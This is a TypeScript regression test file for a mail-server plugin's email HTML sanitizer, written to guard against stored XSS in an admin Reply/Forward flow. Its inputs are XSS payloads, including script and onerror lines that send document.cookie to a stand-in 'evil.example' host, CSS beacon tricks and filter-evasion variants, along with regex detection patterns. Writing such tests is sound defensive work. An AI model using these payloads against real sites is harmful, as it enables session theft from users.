/**
 * Regression: STORED XSS in the Mail Server plugin's Reply/Forward path (audit FRENTE A / P1).
 *
 * Inbound email HTML is attacker-controlled; the admin Reply/Forward flow re-quotes a message's
 * stored body_html back into the admin editor. The durable control is the plugin's write-side
 * sanitizer (marketplace/plugins/mail-server/lib/sanitize-email-html.js), applied before persisting
 * `bodyHtml` on ingest (index.js onData) and covering everything a reader — including the live-DOM
 * compose sink — later loads.
 *
 * This test lives in the backend suite (runs under `cd backend && npm test`) so the control is
 * guarded in CI. It feeds a Reply body carrying <script>, <img onerror>, <a href=javascript:>, and a
 * style-based exfil trick and asserts none survives to the stored value. Revert the sanitize call in
 * index.js (or weaken the allowlist) and these assertions fail — verified by mutating the function to
 * an identity pass-through, which reds 14/18 checks.
 */
import { test } from 'node:test';
import assert from 'node:assert';
// Plain-JS plugin module (no ts-node transform needed for a require of a .js file).
const { sanitizeEmailHtml } = require('../../../marketplace/plugins/mail-server/lib/sanitize-email-html');

// The exact hostile shapes the audit item enumerates.
const REPLY_BODY = [
    `<p>Legit line</p>`,
    `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`,
    `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`,
    `<a href="javascript:alert(document.domain)">click me</a>`,
    `<div style="background:url('https://evil.example/beacon?c='+document.cookie)">styled</div>`,
    `<a href="&#106;avascript:alert(1)">entity-encoded</a>`,
    `<noscript><p title="</noscript><img src=y onerror=alert(1)>">`,
].join('');

function assertNoExecutableSurface(stored: string) {
    const low = stored.toLowerCase();
    assert.ok(!/<\s*script/.test(low), `<script> reached storage: ${stored}`);
    assert.ok(!/<\s*(iframe|object|embed|svg|style|noscript|template)\b/.test(low), `dangerous element reached storage: ${stored}`);
    assert.ok(!/\son[a-z]+\s*=/.test(low), `on* handler reached storage: ${stored}`);
    assert.ok(!/(?:href|src)\s*=\s*["']?\s*(?:javascript|vbscript|data|file|about|blob):/i.test(stored), `dangerous URL scheme reached storage: ${stored}`);
    assert.ok(!/\sstyle\s*=/.test(low), `style attribute (exfil vector) reached storage: ${stored}`);
    assert.ok(!/javascript/i.test(low.replace(/&#\d+;?/g, '')), `'javascript' scheme token reached storage: ${stored}`);
}

test('mail-server: hostile Reply body is sanitized before it can be stored', () => {
    const stored = sanitizeEmailHtml(REPLY_BODY);
    assertNoExecutableSurface(stored);
});

test('mail-server: legitimate quoted formatting survives sanitization', () => {
    const stored = sanitizeEmailHtml(`<p>Hi <strong>team</strong>, see <a href="https://example.com/x">this</a>.</p>`);
    assert.match(stored, /<strong>team<\/strong>/);
    assert.match(stored, /<a href="https:\/\/example\.com\/x">this<\/a>/);
});

// --- Absorbed from marketplace/plugins/mail-server/lib/sanitize-email-html.test.js ---------------
// That file asserted the same control but sat OUTSIDE every CI glob (backend `npm test` only globs
// src/tests/*.test.ts), so it was a regression guard nobody ran — the same defect class as the
// ownership suite next door. These cases were the ones it covered and this file did not; with them
// here the CI-executed suite is a strict superset and the orphan can be deleted.
const EVASIONS: Array<{ name: string; html: string }> = [
    { name: 'whitespace-broken scheme', html: `<a href="java\tscript:alert(1)">x</a>` },
    { name: '<style> CSS exfil', html: `<style>@import url('https://evil.example/c')</style>` },
    { name: '<iframe> js src', html: `<iframe src="javascript:alert(1)"></iframe>` },
    { name: 'svg onload', html: `<svg onload="alert(1)"><rect/></svg>` },
    { name: 'spliced tag', html: `<<script>script>alert(1)<</script>/script>` },
    { name: 'slash-separated attr', html: `<img src=x/onerror=alert(1)>` },
    { name: 'uppercase SCRIPT', html: `<SCRIPT>alert(1)</SCRIPT>` },
    { name: 'onmouseover', html: `<div onmouseover="alert(1)">hover</div>` },
    { name: 'formaction', html: `<button formaction="javascript:alert(1)">go</button>` },
];

for (const atk of EVASIONS) {
    test(`mail-server: stored XSS blocked — ${atk.name}`, () => {
        assertNoExecutableSurface(sanitizeEmailHtml(atk.html));
    });
}

test('mail-server: safe relative/mailto URLs and an http image src survive', () => {
    // The negative assertions above are satisfied by a sanitizer that returns '' for everything, so
    // this positive half is what makes them mean something: real mail must still render.
    const stored = sanitizeEmailHtml(`<a href="/inbox">rel</a><a href="mailto:a@b.com">m</a><img src="https://cdn.example/x.png" alt="ok">`);
    assert.match(stored, /href="\/inbox"/);
    assert.match(stored, /href="mailto:a@b.com"/);
    assert.match(stored, /<img src="https:\/\/cdn\.example\/x\.png" alt="ok"\/>/);
});
